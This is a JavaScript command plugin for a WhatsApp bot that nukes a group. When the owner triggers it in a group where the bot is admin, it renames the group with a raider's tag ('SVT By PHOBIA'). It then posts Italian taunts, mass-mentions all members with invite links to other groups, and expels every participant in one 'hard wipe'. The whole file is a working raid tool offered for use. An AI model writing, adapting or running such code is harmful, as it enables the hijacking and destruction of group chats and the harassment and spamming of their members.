let handler = async (m, { conn, participants, isBotAdmin }) => {
    if (!m.isGroup) return;

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    if (!isBotAdmin) return;

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // 🔹 CAMBIO NOME GRUPPO
    try {
        let metadata = await conn.groupMetadata(m.chat);
        let oldName = metadata.subject;
        let newName = `${oldName} | 𝚂𝚅𝚃 𝙱𝚢  ⱣⱧØ฿ɪ𐌀`;
        await conn.groupUpdateSubject(m.chat, newName);
    } catch (e) {
        console.error('Errore cambio nome gruppo:', e);
    }

    let usersToRemove = participants
        .map(p => p.jid)
        .filter(jid =>
            jid &&
            jid !== botId &&
            !ownerJids.includes(jid)
        );

    if (!usersToRemove.length) return;

    let allJids = participants.map(p => p.jid);

    await conn.sendMessage(m.chat, {
        text: "𝐦𝐞𝐨𝐰 𝐞̀ 𝐪𝐮𝐢… 𝐩𝐢𝐚𝐧𝐠𝐢, 𝐭𝐚𝐧𝐭𝐨 𝐧𝐨𝐧 𝐬𝐞𝐫𝐯𝐞 𝐚 𝐧𝐢𝐞𝐧𝐭𝐞. 𝐞̀ 𝐠𝐢𝐚̀ 𝐟𝐢𝐧𝐢𝐭𝐚"
    });

    await conn.sendMessage(m.chat, {
        text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 ⱣⱧØ฿ɪ𐌀, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/KF0OoA574aD22ToFqpOuIl?mode=gi_t & ‎https://chat.whatsapp.com/IlzAXWKPkv9AowPje7DO6K?mode=gi_t",
        mentions: allJids
    });

    try {
        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore durante l'hard wipe.");
    }
};

handler.command = ['cry'];
handler.group = true;
handler.botAdmin = true;
handler.owner = true;

export default handler;
